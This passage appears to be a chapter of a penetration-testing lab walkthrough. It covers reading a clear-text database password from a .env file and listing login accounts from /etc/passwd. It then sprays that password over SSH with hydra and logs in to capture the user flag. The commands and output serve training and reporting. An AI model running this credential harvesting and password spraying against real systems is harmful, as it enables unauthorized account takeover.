# 05 — `.env` → password spray → `gari`

`www-data` cannot read much, but it can read the application — and the application keeps its database
password in a `.env` file. That password is reused as an operating-system password.

## 5.1 The application source on disk

```bash
www-data@oscp:/var/www/html$ ls -la /opt/dev/new-site
total 156
drwxr-xr-x 4 www-data www-data  4096 Mar 22  2023 .
drwxr-xr-x 3 root     root      4096 Mar 22  2023 ..
-rw-r--r-- 1 www-data www-data   124 Mar 22  2023 .env
-rw-r--r-- 1 www-data www-data 26804 Mar 22  2023 index.php.tar.gz
-rw-r--r-- 1 www-data www-data 19694 Mar 22  2023 services.php.tar.gz
-rw-r--r-- 1 www-data www-data 65042 Mar 22  2023 site_dev.tar.gz
-rw-r--r-- 1 www-data www-data 12224 Mar 22  2023 staff.php.tar.gz
```

A development copy of the site, owned by the web user, with the environment file in the clear:

```bash
www-data@oscp:/opt/dev/new-site$ cat .env
```

```text
APP_ENV=development
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=development
DB_USERNAME=web_admin
DB_PASSWORD=Lam0)vM@ch1n3!
```

The database itself is a distraction: `web_admin` has exactly the access the application already has.
The password is the finding, because it is a **human-chosen string on a box where humans log in**.

## 5.2 The users who can log in

```bash
www-data@oscp:~$ cat /etc/passwd | grep -E '(/bin/bash|/bin/sh)$'
```

```text
root:x:0:0:root:/root:/bin/bash
mason:x:1000:1000::/home/mason:/bin/bash
jordan:x:1001:1001::/home/jordan:/bin/bash
gari:x:1002:1002::/home/gari:/bin/bash
zach:x:1003:1003::/home/zach:/bin/bash
helena:x:1004:1004::/home/helena:/bin/bash
corben:x:1005:1005::/home/corben:/bin/bash
ariana:x:1006:1006::/home/ariana:/bin/bash
noah:x:1007:1007::/home/noah:/bin/bash
...
```

A dozen interactive accounts, all with home directories under `/home`. That is a spray target list, and
the password from `.env` is the single candidate.

## 5.3 Spraying the password

A single known password against a user list, throttled so the box is not hammered:

```bash
hydra -L users.txt -p 'Lam0)vM@ch1n3!' ssh://192.168.91.112 -t 4
```

`users.txt` is the bash-shell list above, one account per line. The hit:

```text
Hydra v9.5 (c) 2023 by van Hauser/THC
Hydra starting at 2026-07-19 15:10:39
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14 login tries (l:14/p:1), ~4 tries per task
[DATA] attacking ssh://192.168.91.112:22/
[22][ssh] host: 192.168.91.112   login: gari   password: Lam0)vM@ch1n3!
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-07-19 15:11:06
```

One password, fourteen accounts, twenty-seven seconds. This is why password reuse between an
application and the operating system is a finding on its own: it converts a web shell into a login.

## 5.4 SSH as `gari`

```bash
┌─[kali@kali]─[~/Desktop/oscp_exam/THIRD]
└──╼ $ ssh gari@192.168.91.112
The authenticity of host '192.168.91.112' can't be established.
ED25519 key fingerprint is SHA256:YFHa7BX0BXQcJjS6A7XAsAEpa7Ujr9Vzc9Ocy9...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
gari@192.168.91.112's password:
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 5.15.0-67-generic x86_64)
```

```text
gari@oscp:~$
```

## 5.5 The user flag

```bash
gari@oscp:~$ cat local.txt
eb8bcdb8e5b8ad0c****************
gari@oscp:~$ hostname; whoami; ip a | grep -w inet
oscp
gari
    inet 192.168.91.112/24 brd 192.168.91.255 scope global eth0
```

Masked here; the command, the output and the host belong in one image for the report.

`local.txt` completes the user half of the box. The root half is a `sudo` misconfiguration, and it is
two commands away.

---

**Next:** [`06-privilege-escalation.md`](06-privilege-escalation.md)
